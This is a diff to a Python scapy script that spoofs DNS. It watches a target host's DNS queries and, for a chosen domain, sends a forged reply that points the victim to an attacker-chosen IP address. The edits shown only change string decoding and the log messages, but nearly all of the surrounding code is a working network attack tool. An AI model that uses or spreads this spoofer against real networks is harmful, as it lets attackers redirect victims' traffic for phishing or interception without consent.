@@ -3,8 +3,12 @@ import scapy.all as sc
 def dns_spoof(packet, target_ip, spoofed_ip, target_domain):
     if packet.haslayer(sc.DNS) and packet[sc.IP].src == target_ip and packet[sc.DNS].qr == 0:
         qname = packet[sc.DNS].qd.qname
+        try:
+            qname_str = qname.decode()
+        except:
+            qname_str = str(qname)
         if qname == target_domain:
-            print(f"[+] Spoofing DNS request for {qname.decode()} from {packet[sc.IP].src}")
+            print("[*] Spoofing DNS request for %s from %s" % (qname_str, packet[sc.IP].src))
             ip_layer = sc.IP(dst=packet[sc.IP].src, src=packet[sc.IP].dst)
             udp_layer = sc.UDP(dport=packet[sc.UDP].sport, sport=53)
             dns_layer = sc.DNS(
@@ -15,4 +19,4 @@ def dns_spoof(packet, target_ip, spoofed_ip, target_domain):
             spoofed_packet = ip_layer/udp_layer/dns_layer
             sc.send(spoofed_packet, verbose=False)
         else:
-            print(f"[-] Ignoring DNS for {qname.decode()}")
+            print("[!] Ignoring DNS for %s" % qname_str)
